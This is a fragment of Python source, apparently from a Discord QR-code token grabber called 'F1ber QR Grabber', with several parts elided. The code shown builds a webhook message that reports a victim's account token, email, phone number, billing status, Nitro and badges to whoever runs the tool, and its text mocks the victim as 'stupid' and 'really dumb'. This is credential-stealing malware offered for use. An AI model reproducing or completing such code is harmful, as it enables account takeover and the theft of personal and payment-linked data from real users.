...
def QR_Grabber(Webhook):
    ...
    return token;
            ...
            embed = {
                "avatar_url":"https://cdn.discordapp.com/attachments/916450381943439413/980123111527690251/ezgif.com-gif-maker_4.gif",
                "embeds": [
                    {
                        "author": {
                            "name": "F1ber QR Grabber",
                            "icon_url": "https://cdn.discordapp.com/attachments/916450381943439413/980123017436872714/ezgif.com-gif-maker_3.gif"
                        },
                        "description": f"**{user}** is stupid\n\n**Has Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}\n**Email:** {email}\n**Phone:** {phone}\n**[Avatar]({url})**",
                        "fields": [
                            {
                              "name": "**Token**",
                              "value": f"```fix\n{token}```",
                        ...
                        "footer": {
                          "text": "Mmmh this person is really dumb"
                        }
                    }
                ]
            }
